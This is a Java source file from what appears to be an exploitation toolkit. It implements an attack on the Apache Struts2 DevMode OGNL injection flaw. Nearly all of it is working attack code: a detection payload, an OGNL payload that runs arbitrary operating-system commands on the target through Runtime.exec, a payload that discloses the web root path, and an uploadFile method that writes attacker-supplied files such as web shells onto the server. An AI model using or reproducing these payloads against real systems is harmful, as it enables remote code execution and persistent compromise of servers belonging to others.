package fun.fireline.exp.apache.struts2;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.net.URLEncoder;
import java.util.HashMap;
import java.util.UUID;

/**
 * @author yhy
 * @date 2021/8/17 13:57
 * @github https://github.com/yhy0
 */

public class S2_DevMode implements ExploitInterface {

    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();

    private String check_payload = "debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=UUID";

    private String payload = "debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=webpath881118888&command=payload";

    private String webPath = "?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest";


    @Override
    public String checkVul(String url) {
        this.target = url;
        String uuid =  UUID.randomUUID().toString();

        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        String data = this.check_payload.replace("UUID", uuid);
        Response response = HttpTools.post(this.target, data, this.headers, "UTF-8");

        if(response.getText() != null  && response.getText().contains(uuid)) {
            this.isVul = true;
            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        String data = this.payload.replace("payload", cmd);
        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        Response response = HttpTools.post(this.target, data, headers, encoding);
        return response.getText();
    }

    @Override
    public String getWebPath() {

        Response response = HttpTools.get(this.target + webPath, headers, "UTF-8");
        return Tools.regReplace(response.getText());

    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {
        fileContent = URLEncoder.encode(fileContent, "UTF-8" );

        String payload = "debug=browser&object=(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(1128112382),%23w.close())&shellname=/SHELLPATH&shellContent=SHELLContent&encoding=UTF-8&pp=%2f";

        payload = payload.replace("SHELLPATH", filename).replace("SHELLContent", fileContent);


        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        Response response = HttpTools.post(this.target, payload, headers, "UTF-8");

        String result = response.getText();

        if(result.contains("1128112382")) {
            result = result + "  上传成功! ";
        } else {
            result =  "上传失败";
        }

        return result;

    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
